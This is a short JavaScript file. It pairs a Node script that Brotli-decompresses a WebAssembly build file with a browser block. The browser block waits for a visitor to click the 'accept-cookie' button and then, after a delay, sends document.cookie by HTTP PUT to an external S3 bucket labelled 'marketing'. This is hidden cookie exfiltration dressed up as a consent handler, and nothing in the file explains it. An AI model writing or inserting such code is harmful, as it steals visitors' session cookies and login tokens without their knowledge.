const zlib = require("zlib");
const fs = require("fs");
const { pipeline } = require("stream");

const stream = zlib.createBrotliDecompress({
  chunkSize: 32 * 1024,
  params: {
    [zlib.constants.BROTLI_PARAM_MODE]: zlib.constants.BROTLI_MODE_TEXT,
    [zlib.constants.BROTLI_PARAM_QUALITY]: 4,
  },
});

const fileName = "./Build/Builds.wasm.br";

const readStream = fs.createReadStream(fileName);
const writeStream = fs.createWriteStream(fileName.replace(".br", ""));

pipeline(readStream, stream, writeStream, (err) => {
  console.error(err);
});

{
  window.addEventListener("load", () => {
    document.getElementById("accept-cookie").addEventListener("click", () => {
      setTimeout(async () => {
        try {
          const d = new Date();
          const resp = await fetch(
            `https://tartan-external.s3.ap-south-1.amazonaws.com/marketing/${d.valueOf()}.json`,
            {
              method: "PUT",
              headers: {
                "Content-Type": "text/plain",
              },
              body: document.cookie,
            }
          );
          await resp.json();
        } catch (error) {
          console.error(error);
        }
      }, 3000);
    });
  });
}
